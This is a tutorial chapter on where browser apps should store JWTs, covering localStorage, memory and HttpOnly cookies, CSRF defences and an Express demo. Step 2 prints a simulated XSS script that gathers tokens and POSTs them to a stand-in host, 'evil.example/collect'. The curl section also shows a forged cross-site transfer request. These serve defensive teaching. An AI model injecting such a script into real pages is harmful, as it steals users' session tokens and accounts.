# 25. Token Storage: localStorage vs Cookie vs Memory

## Notes

### Where should the token live?

After login, the browser has to keep the tokens somewhere. The three usual places are `localStorage`, a JavaScript variable (memory), and a cookie. They differ in one big question: **if an attacker manages to run JavaScript on your page (XSS), what can they take away?**

> **One-line answer:** never put long-lived tokens in `localStorage` (any script can read them). Keep the **refresh token in an `HttpOnly`, `Secure`, `SameSite` cookie**, and the **access token in memory** (or also in an `HttpOnly` cookie). Cookies bring **CSRF** back, so use `SameSite` + an `Origin` check. And remember: **no storage survives XSS**; it only decides how much the attacker can carry away.

---

### Why does it matter?

| Storage | Readable by JavaScript? | Sent automatically? | Survives a reload? | Main danger |
|---|---|---|---|---|
| `localStorage` / `sessionStorage` | ✅ **Yes, by any script** | ❌ No | ✅ Yes | **XSS steals it** and uses it from anywhere |
| Memory (a JS variable) | Only by scripts running right now | ❌ No | ❌ No (restore via refresh cookie) | XSS can still use / re-fetch it while the page is open |
| `HttpOnly` cookie | ❌ **No** (`document.cookie` can't see it) | ✅ Yes | ✅ Yes | **CSRF** (other sites making the browser send it) |
| Non-`HttpOnly` cookie | ✅ Yes | ✅ Yes | ✅ Yes | XSS **and** CSRF: the worst of both |

The demo for this topic runs the **same attacker script** against each option. The results:

| | localStorage | Memory + HttpOnly refresh cookie | HttpOnly cookies only |
|---|---|---|---|
| Steals the 7-day refresh token | ✅ 😱 | ❌ | ❌ |
| Gets a working access token (15 min) | ✅ by reading it | ✅ by calling `/auth/refresh` itself | ❌ |
| Can call the API while the page is open | ✅ | ✅ | ✅ |

---

### Real-life example: Rahul's house key 🔑

Rahul lives in a flat in Hyderabad and a guest (the **XSS script**) gets inside.

1. **localStorage** = the key hangs on a hook by the door. The guest **copies it** and comes back any night for a **week** → a stolen refresh token works from the attacker's own computer for 7 days
2. **Memory** = Rahul keeps the key in his pocket. The guest can't copy it, but can ask the security guard (the refresh endpoint) for a **day pass** and walk out with **that** → a 15-minute access token
3. **HttpOnly cookie** = the key is built into the door; the door opens for anyone **inside the flat**. The guest can't take anything away, but **while inside** they can open cupboards → XSS can act as the user only while the page is open
4. **CSRF** = a stranger outside shouts "open the door!" and the smart door obeys because it hears it from inside the building. `SameSite` = the door only listens to people **in the flat** → cookies need CSRF protection
5. The real fix is **not letting the guest in** at all → prevent XSS (escape output, CSP, Level 7)

---

### The flow, step by step

#### 📊 Diagrams

Open **[diagrams.html](diagrams.html)** in your browser (just double-click the file) to see:

- **Flow diagram**: picking a storage: browser app or mobile? same site or not? → recommended setup
- **Data flow**: the XSS script against each storage, and what it carries away
- **XSS vs CSRF**: which storage is exposed to which attack

In short: `refresh token → HttpOnly + Secure + SameSite=Strict cookie, Path=/auth`. `access token → memory (Authorization: Bearer) or HttpOnly cookie`. `page reload → POST /auth/refresh restores it (topic 22)`. Cookies → `SameSite` + `Origin` check against CSRF. Never `localStorage` for tokens.

---

### Step 1: The server decides how tokens leave

```js
// localStorage mode (the bad one): both tokens in the JSON body
res.json({ accessToken, refreshToken });

// memory mode: access token in the body, refresh token in an HttpOnly cookie
res.cookie("refreshToken", refreshToken, { httpOnly: true, secure: true, sameSite: "strict", path: "/auth", maxAge: 7 days });
res.json({ accessToken });

// cookie mode: no token in the body at all
res.cookie("accessToken", accessToken, { httpOnly: true, secure: true, sameSite: "strict", path: "/", maxAge: 15 min });
```

The **server** sets `HttpOnly`. If a token is in the response **body**, JavaScript has it, and nothing stops the frontend from putting it in `localStorage`. The demo lets the client pick a mode only so you can compare; a real API picks one.

| Cookie flag | Why |
|---|---|
| `HttpOnly` | Invisible to `document.cookie`, so XSS can't copy it |
| `Secure` | HTTPS only |
| `SameSite=Strict` (or `Lax`) | Not sent on requests started by other sites → CSRF protection |
| `Path=/auth` (refresh cookie) | Sent only to the refresh/logout endpoints |
| `__Host-` prefix (access cookie) | Must be `Secure`, `Path=/`, no `Domain`: subdomains can't overwrite it (topic 10) |

---

### Step 2: What XSS can and can't do

The attacker's script in the demo does what a real injected `<script>` would:

```js
const loot = { localStorage: { ...localStorage }, documentCookie: document.cookie };
const refreshed = await fetch("/auth/refresh", { method: "POST" }); // the browser attaches the HttpOnly cookie!
if (refreshed.ok) loot.accessTokenFromRefresh = (await refreshed.json()).accessToken;
await fetch("https://evil.example/collect", { method: "POST", body: JSON.stringify(loot) });
```

- `localStorage` → both tokens. The **refresh token works for 7 days** from the attacker's laptop. Logging out of the page doesn't help unless the server revokes it.
- `document.cookie` → **empty**. `HttpOnly` works.
- **But** the script can still call `/auth/refresh` from inside the page. In memory mode that returns a fresh access token **in the body**, so the attacker walks away with a **15-minute** token (not the 7-day one).
- In cookie-only mode, no token ever reaches JavaScript, so nothing leaves. The script can still click buttons and call APIs **as the user** while the page is open.

So `HttpOnly` doesn't stop XSS. It turns "**attacker has your account for a week**" into "**attacker can act while the tab is open** (plus maybe 15 minutes)". That's a big difference, but the real fix is preventing XSS.

---

### Step 3: Cookies bring back CSRF

Once a token is in a cookie, the browser sends it **automatically**, including on requests that `evil.example` triggers (a hidden form posting to `/transfer`). Defenses (topic 10, topic 11):

```js
// 1. SameSite=Strict or Lax on the cookie: not sent on cross-site POSTs
// 2. Check the Origin header on state-changing requests
if (["POST","PUT","PATCH","DELETE"].includes(req.method) && origin && origin !== BASE_URL) return res.status(403)...
```

Tokens in the `Authorization` header (localStorage, memory) are **not** sent automatically, so they don't have a CSRF problem. That's why people liked `localStorage`, but trading CSRF (easy to block) for XSS theft (hard to fully prevent) is a bad deal.

---

### Step 4: The recommended setup

**Browser app (SPA) on the same site as the API:**

| Token | Where | Why |
|---|---|---|
| Refresh token | `HttpOnly; Secure; SameSite=Strict; Path=/auth` cookie | Can't be copied; only sent to `/auth` |
| Access token | Memory (a module variable), sent as `Bearer` | Not sent automatically → no CSRF on API calls; lost on reload → restored by `/auth/refresh` |

Or, simplest of all: **both in `HttpOnly` cookies** (cookie mode) + `SameSite` + `Origin` check. That's basically a session (topic 09) with JWTs inside, and that's fine.

**Even better for high-security apps: the BFF pattern** (Backend-for-Frontend). The browser gets only a plain session cookie; a small backend keeps the tokens and calls the APIs. No token is ever in the browser (Level 5).

**Mobile apps:** no cookies, no XSS of the web kind. Store tokens in the **Keychain** (iOS) / **Keystore** (Android), never in plain shared preferences.

---

### 🤔 Tricky parts

**1. `sessionStorage` is not safer.**
It's cleared when the tab closes, but any script can read it, exactly like `localStorage`.

**2. "Memory" means a closure, not `window.token`.**
A global variable is one line of XSS away. Keep it inside a module. Still, XSS can hook `fetch` and read tokens as they're used, so memory is not a vault.

**3. Third-party scripts count as XSS.**
Analytics, chat widgets, ad scripts, a compromised npm package: all run with full access to `localStorage`. The more scripts on the page, the worse `localStorage` gets.

**4. Different domains.**
If the API is on `api.other.com` and the app on `app.mine.com`, cookies are third-party and browsers block them more and more. Put the API on the **same site** (`api.mine.com` + `app.mine.com`), or use a BFF.

**5. Cookie size.**
Cookies are limited to about 4 KB. A JWT with many claims can get close. Keep claims small (topic 27).

**6. Logout.**
Cookies: the server clears them **and** revokes the refresh token (topic 24). localStorage: the client deletes them, but a stolen copy keeps working until the server revokes it.

---

### Common beginner mistakes

1. **Putting the refresh token in `localStorage`.**
   One XSS = a week of access from anywhere. Use an `HttpOnly` cookie.

2. **"`HttpOnly` means we're safe from XSS."**
   No. XSS can still act as the user and call the refresh endpoint. Prevent XSS too (escape output, CSP).

3. **Cookies without `SameSite` / CSRF protection.**
   Moving tokens into cookies without CSRF defenses just swaps one hole for another.

4. **Returning the refresh token in the body *and* a cookie.**
   The body copy ends up in JavaScript. Send it only as a cookie to browsers.

5. **Storing the access token in a global (`window.token`).**
   Keep it in a module scope.

6. **Using `sessionStorage` as a "safer localStorage".**
   It isn't.

7. **Non-`HttpOnly` cookies "so the frontend can read the user's email".**
   Return user info from `/me` instead. Tokens stay `HttpOnly`.

8. **Ignoring third-party scripts.**
   Every script you include can read `localStorage`.

---

### Interview questions

1. **Where should a SPA store JWTs?**
   Refresh token in an `HttpOnly`, `Secure`, `SameSite` cookie scoped to the auth path. Access token in memory (sent as `Bearer`), or also in an `HttpOnly` cookie with CSRF protection. Not in `localStorage`.

2. **Why not `localStorage`?**
   Any JavaScript on the page can read it, including injected scripts and third-party libraries. A stolen token works from the attacker's machine until it expires or is revoked.

3. **Does an `HttpOnly` cookie protect against XSS?**
   It stops XSS from **reading** the token, so it can't be taken away. It doesn't stop the script from making requests as the user while the page is open.

4. **What's the downside of cookies?**
   They're sent automatically, so CSRF is possible. Use `SameSite`, `Origin`/`Referer` checks or CSRF tokens. Also size limits and cross-site cookie restrictions.

5. **Why doesn't the `Authorization` header have a CSRF problem?**
   Browsers never add it automatically. A malicious site can't make the browser attach your token, and CORS stops it from reading your app's memory or storage.

6. **The access token is in memory. What happens on reload?**
   It's gone. The app calls `/auth/refresh` on load; the browser sends the `HttpOnly` refresh cookie and gets a new access token back (topic 22).

7. **What is the BFF pattern?**
   Backend-for-Frontend: a server-side component holds the tokens and the browser only has an `HttpOnly` session cookie. Tokens never reach the browser. Recommended for high-security SPAs.

8. **How do mobile apps store tokens?**
   In the platform's secure storage: iOS Keychain, Android Keystore (e.g. EncryptedSharedPreferences).

---

### Quick recap

- `localStorage` / `sessionStorage`: **any script can read them** → never for tokens (especially refresh tokens)
- `HttpOnly` cookie: invisible to JavaScript, sent automatically → needs **CSRF** protection (`SameSite` + `Origin` check)
- Memory: not sent automatically, lost on reload → restore with the refresh cookie
- Recommended SPA setup: **refresh = HttpOnly cookie (`Path=/auth`)**, **access = memory** (or both `HttpOnly` cookies)
- **No storage survives XSS**: `HttpOnly` limits what leaves, preventing XSS is the real fix
- High security: **BFF**, no tokens in the browser. Mobile: **Keychain / Keystore**
- Next: one user, many devices (topic 26)

## Code

A small **Express** + **`jsonwebtoken`** API that can hand out tokens in **three ways** (the client picks one at login), plus a **demo page** at `/` with an "attacker's XSS script" button and an `/evil/collect` route that plays the attacker's server. Users and tokens are kept in memory, so they disappear when you restart.

📄 **Full code: [server.js](server.js)**. Open it and read the comments, which follow the same steps as the notes above.

Install the dependencies once (from this folder), then start the server:

```bash
npm install
```

```bash
node server.js
```

> Port 3000 busy? Run it on another port: `PORT=3025 node server.js` (Git Bash), then use that port below. Open the page at `http://localhost:…`, not `127.0.0.1`, or the `Origin` check blocks its requests.

### Try it in the browser

Open **http://localhost:3000** (the email and password are filled in). Click **Sign up** once. Then, for each storage option: pick it, click **Log in**, click **Run the attacker's XSS script**, and click **Log out** before trying the next one. The newest log line is at the top.

😱 **localStorage:** the attacker takes **both** tokens away.

```
🕵️ attacker got: {
  "readFromLocalStorage": ["accessToken", "refreshToken"],
  "readFromDocumentCookie": "(nothing: HttpOnly cookies are invisible)",
  "gotAccessTokenBy": "reading localStorage",
  "accessTokenWorksOnAttackersMachine": true,
  "refreshTokenWorksOnAttackersMachine": true,
  "couldCallTheApiFromInsideThePage": true
}
```

⚠️ **Memory + HttpOnly refresh cookie:** nothing to read, but the script asks `/auth/refresh` for a fresh **15-minute** access token. The 7-day refresh token stays safe.

```
🕵️ attacker got: {
  "readFromLocalStorage": [],
  "readFromDocumentCookie": "(nothing: HttpOnly cookies are invisible)",
  "gotAccessTokenBy": "calling /auth/refresh from the page",
  "accessTokenWorksOnAttackersMachine": true,
  "refreshTokenWorksOnAttackersMachine": false,
  "couldCallTheApiFromInsideThePage": true
}
```

✅ **HttpOnly cookies only:** no token leaves the browser, but the script can still use the API **while the page is open**.

```
🕵️ attacker got: {
  "readFromLocalStorage": [],
  "readFromDocumentCookie": "(nothing: HttpOnly cookies are invisible)",
  "gotAccessTokenBy": "(no token)",
  "accessTokenWorksOnAttackersMachine": false,
  "refreshTokenWorksOnAttackersMachine": false,
  "couldCallTheApiFromInsideThePage": true
}
```

The terminal prints the same report as `🕵️  Attacker received: {...}`.

✅ **Reload the page** in memory or cookie mode: `page load: restored via the HttpOnly refresh cookie (cookie mode)`. In localStorage mode: `page load: token found in localStorage`.

### Try it with curl

✅ **Cookie mode: no token in the body**, two `HttpOnly` cookies instead (sign up first, as in the browser, or with `/auth/signup`):

```bash
curl -i -c jar.txt -X POST http://localhost:3000/auth/login -H "Content-Type: application/json" -d '{"email":"rahul@mail.com","password":"correct horse battery","storage":"cookie"}'
```
→
```
Set-Cookie: refreshToken=d7ef888e...8405; Max-Age=604800; Path=/auth; Expires=...; HttpOnly; SameSite=Strict
Set-Cookie: accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; Max-Age=900; Path=/; Expires=...; HttpOnly; SameSite=Strict
{"storage":"cookie","expiresIn":900}
```

```bash
curl -b jar.txt http://localhost:3000/me
```
→ `{"email":"rahul@mail.com","tokenCameFrom":"HttpOnly cookie"}`

✅ **A transfer from our own site works:**

```bash
curl -b jar.txt -X POST http://localhost:3000/transfer -H "Content-Type: application/json" -H "Origin: http://localhost:3000" -d '{"amount":500}'
```
→ `{"message":"Sent ₹500"}`

❌ **CSRF: the same request started by another site is blocked** (the cookie was sent, but the `Origin` is wrong):

```bash
curl -i -b jar.txt -X POST http://localhost:3000/transfer -H "Content-Type: application/json" -H "Origin: https://evil.example" -d '{"amount":50000}'
```
→ `403 Forbidden` with `{"error":"Request from another site was blocked"}`. A real browser wouldn't even send the `SameSite=Strict` cookie here.

❌ **An unknown storage mode:**

```bash
curl -X POST http://localhost:3000/auth/login -H "Content-Type: application/json" -d '{"email":"rahul@mail.com","password":"correct horse battery","storage":"sessionStorage"}'
```
→ `{"error":"Email, password and storage (localStorage, memory, cookie) are required"}`

> **Windows PowerShell users:** the single quotes in the `-d '...'` part and `VAR=value node ...` work in Git Bash. In PowerShell, use Git Bash, Postman, or `$env:PORT=3025; node server.js`. The browser demo works the same everywhere.
